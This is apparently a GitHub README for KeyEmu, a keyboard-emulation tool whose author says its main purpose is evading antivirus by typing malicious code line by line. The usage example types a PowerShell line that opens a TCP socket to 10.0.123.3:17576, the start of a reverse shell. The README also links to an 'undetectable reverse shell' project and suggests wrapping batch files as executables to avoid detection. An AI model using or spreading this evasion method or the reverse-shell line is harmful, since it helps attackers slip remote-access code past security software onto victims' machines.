		  
		      ___           ___                       ___           ___           ___     
		     /|  |         /\__\                     /\__\         /\  \         /\  \    
		    |:|  |        /:/ _/_         ___       /:/ _/_       |::\  \        \:\  \   
		    |:|  |       /:/ /\__\       /|  |     /:/ /\__\      |:|:\  \        \:\  \  
		  __|:|  |      /:/ /:/ _/_     |:|  |    /:/ /:/ _/_   __|:|\:\  \   ___  \:\  \ 
		 /\ |:|__|____ /:/_/:/ /\__\    |:|  |   /:/_/:/ /\__\ /::::|_\:\__\ /\  \  \:\__\
		 \:\/:::::/__/ \:\/:/ /:/  /  __|:|__|   \:\/:/ /:/  / \:\~~\  \/__/ \:\  \ /:/  /
		  \::/~~/~      \::/_/:/  /  /::::\  \    \::/_/:/  /   \:\  \        \:\  /:/  / 
		   \:\~~\        \:\/:/  /   ~~~~\:\  \    \:\/:/  /     \:\  \        \:\/:/  /  
		    \:\__\        \::/  /         \:\__\    \::/  /       \:\__\        \::/  /   
		     \/__/         \/__/           \/__/     \/__/         \/__/         \/__/

# KeyEmu🐫
## 🐫What is KeyEmu (KeyboardEmulator)?

KeyEmu🐫 is name after Keyboard Emulator that emulate the keyboard input to the machine as a programmatic way by just a simple command and no external library are needed. This is the modified version of this original [reddit post](https://www.reddit.com/r/PowerShell/comments/3qk9mc/keyboard_keypress_script/) on 2016 by LandOfTheLostPass. It build focus on ✌🏾 main features such as:

 - Emulate the **normal text** typing input as a string
 - Emulate the **press of any special** or (combination of special key in next release)

**Excuse me the code is not that good yet, I just rush to get it fix and work in the way I wanted 🐱‍🏍

## 🐫Why is KeyEmu?

I can only come up with two of these and the second is the main purpose haha (evil):
- The use case of this program could be for **automating simple task** by simply loop 🥨the command using simple program to do same task over time
- **Bypass any security detection** while executing malicious 🦠code by executing code line by line rather then the hole file that one which is difficult to detect by most anti virus out there.

## 🐫How to use KeyEmu?

No big deal super easy just like cooking rice (because I'm Asian) 😂

 1. Download the latest release of [keyemu.exe](https://github.com/panhavad/keyboard-emulator/releases) 
 2. Open CMD
 3. Change directory to the directory that you keep keyemu.exe
 4. Run either of this command to use either of the feature

	**✨To emulate the whole string**
	```
    keyemu -text "$socket = new-object System.Net.Sockets.TcpClient('10.0.123.3', 17576);"
    ```
    NOTE: When you run a complex command like this, be aware of escape character in command line. User ""double quote"" to escape another "double quote".😁
    
    **✨To emulate the RETURN / ENTER key press**
	```
    keyemu -key RETURN
    ```

## 🐫Does it really work?
Hay get a small prove that it really work. 😪 This is the script execute line by line using the command from keyemu that written in batch file then convert to exe. Result of anti virus undetectable. *Wanna see the full script of this shell being bind without malware detection?* [Come here](https://github.com/panhavad/undetectable-reverse-shell-win10)😉

![enter image description here](https://i.postimg.cc/ZKVV19mf/Untitled-Project.gif)

## 🐫Last Message

*All of those feature and command are practically useful or work better when you use this in batch file and convert to exe. And please use it at your own risk.*

